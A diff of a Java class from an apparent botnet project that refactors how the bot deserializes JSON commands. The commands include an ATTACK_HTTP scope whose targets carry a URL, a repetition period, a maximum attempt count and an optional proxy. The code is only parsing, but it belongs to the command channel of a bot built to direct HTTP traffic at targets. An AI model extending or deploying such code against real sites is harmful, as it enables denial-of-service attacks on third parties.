@@ -24,7 +24,7 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.command.json;
+package com.acmutv.botnet.core.command.serial;
 
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
@@ -33,8 +33,8 @@ import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.CommandScope;
 import com.acmutv.botnet.core.target.HttpTarget;
 import com.acmutv.botnet.tool.time.Duration;
+import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonParser;
-import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.DeserializationContext;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
@@ -43,10 +43,8 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import java.io.IOException;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.net.URL;
+import java.util.*;
 
 /**
  * This class realizes the JSON deserializer for {@link BotCommand}.
@@ -79,7 +77,7 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
    * Initializes the singleton of {@link BotCommandDeserializer}.
    */
   private BotCommandDeserializer() {
-    super((Class<?>) null);
+    super((Class<BotCommand>) null);
   }
 
   @Override
@@ -117,7 +115,12 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (!node.has("settings")) {
             throw new IOException("Cannot read parameter [settings] for scope [UPDATE] (missing)");
           }
-          final Map<String,String> settings = parseMapStringString(node.get("settings"));
+          Map<String,String> settings = new HashMap<>();
+          node.get("settings").fields().forEachRemaining(e -> {
+            String k = e.getKey();
+            String v = e.getValue().asText();
+            settings.put(k, v);
+          });
           cmd.getParams().put("settings", settings);
           break;
 
@@ -125,7 +128,7 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (!node.has("timeout")) {
             throw new IOException("Cannot read parameter [timeout] for scope [SLEEP] (missing)");
           }
-          final Duration sleepTimeout = parseObject(node.get("timeout"), Duration.class);
+          final Duration sleepTimeout = Duration.valueOf(node.get("timeout").asText());
           cmd.getParams().put("timeout", sleepTimeout);
           break;
 
@@ -133,7 +136,7 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (!node.has("timeout")) {
             throw new IOException("Cannot read parameter [timeout] for scope [SHUTDOWN] (missing)");
           }
-          final Duration shutdownTimeout = parseObject(node.get("timeout"), Duration.class);
+          final Duration shutdownTimeout = Duration.valueOf(node.get("timeout").asText());
           cmd.getParams().put("timeout", shutdownTimeout);
           break;
 
@@ -141,13 +144,10 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (!node.has("method") || !node.has("targets")) {
             throw new IOException("Cannot read parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
           }
-          final HttpMethod httpAttackMethod = HttpMethod.from(node.get("method").asText());
-          final List<HttpTarget> httpTargets = parseList(node.get("targets"), HttpTarget.class);
-          final HttpProxy httpProxy = (node.hasNonNull("proxy")) ?
-              parseHttpProxy(node.get("proxy")) : null;
-          cmd.getParams().put("method", httpAttackMethod);
+          final HttpMethod httpMethod = HttpMethod.from(node.get("method").asText());
+          final List<HttpTarget> httpTargets = parseTargets(node.get("targets"));
+          cmd.getParams().put("method", httpMethod);
           cmd.getParams().put("targets", httpTargets);
-          cmd.getParams().put("proxy", httpProxy);
           break;
 
         default:
@@ -159,72 +159,31 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
   }
 
   /**
-   * Parses an object from a JSON node.
+   * Parses a list of {@link HttpTarget} from a JSON node.
    * @param node the JSON node to parse.
-   * @param type the object class reference.
-   * @param <T> the object class.
-   * @return the parsed object; null, in case of error.
+   * @return the parsed list of {@link HttpTarget}.
    */
-  private static <T> T parseObject(JsonNode node, Class<T> type) {
+  private static List<HttpTarget> parseTargets(JsonNode node) throws IOException {
     ObjectMapper mapper = new ObjectMapper();
-    T obj;
-    try {
-      obj = mapper.treeToValue(node, type);
-    } catch (JsonProcessingException e) {
-      e.printStackTrace();
-      obj = null;
-    }
-    return obj;
-  }
-
-  /**
-   * Parses an {@link HttpProxy} from a JSON node.
-   * @param node the JSON node to parse.
-   * @return the parsed {@link HttpProxy}.
-   * @throws IOException when proxy cannot be parsed.
-   */
-  private static HttpProxy parseHttpProxy(JsonNode node) throws IOException {
-    if (!node.has("address") || !node.has("port")) {
-      throw new IOException("Cannot read parameters [address,port] for object [PROXY]");
-    }
-    final String address = node.get("address").asText();
-    final int port = node.get("port").asInt();
-    return new HttpProxy(address, port);
-  }
-
-  /**
-   * Parses a list of objects from a JSON node.
-   * @param node the JSON node to parse.
-   * @param type the object class reference.
-   * @param <T> the object class.
-   * @return the parsed list of objects; an empty list, in case of error.
-   */
-  private static <T> List<T> parseList(JsonNode node, Class<T> type) {
-    ObjectMapper mapper = new ObjectMapper();
-    List<T> list = new ArrayList<>();
-    node.forEach(n -> {
-      try {
-        T obj = mapper.treeToValue(n, type);
-        list.add(obj);
-      } catch (JsonProcessingException e) {
-        e.printStackTrace();
+    List<HttpTarget> targets = new ArrayList<>();
+    Iterator<JsonNode> iter = node.elements();
+    while (iter.hasNext()) {
+      JsonNode n = iter.next();
+      if (!n.hasNonNull("url") ||
+          !n.hasNonNull("period") ||
+          !n.hasNonNull("maxAttempts")) {
+        continue;
       }
-    });
-    return list;
-  }
-  /**
-   * Parses a map from a JSON node.
-   * @param node the JSON node to parse.
-   * @return the parsed map; an empty map, in case of error.
-   */
-  private static Map<String, String> parseMapStringString(JsonNode node) {
-    Map<String,String> map = new HashMap<>();
-    node.elements().forEachRemaining(n -> {
-      if (!n.has("property") || !n.has("value")) return;
-      final String k = n.get("property").asText();
-      final String v = n.get("value").asText();
-      map.put(k, v);
-    });
-    return map;
+      final String url = n.get("url").asText();
+      final Interval period = Interval.valueOf(n.get("period").asText());
+      final long maxAttempt = n.get("maxAttempts").asLong();
+      HttpProxy proxy = null;
+      if (n.hasNonNull("proxy")) {
+        proxy = HttpProxy.valueOf(n.get("proxy").asText());
+      }
+      HttpTarget target = new HttpTarget(new URL(url), period, maxAttempt, proxy);
+      targets.add(target);
+    }
+    return targets;
   }
 }
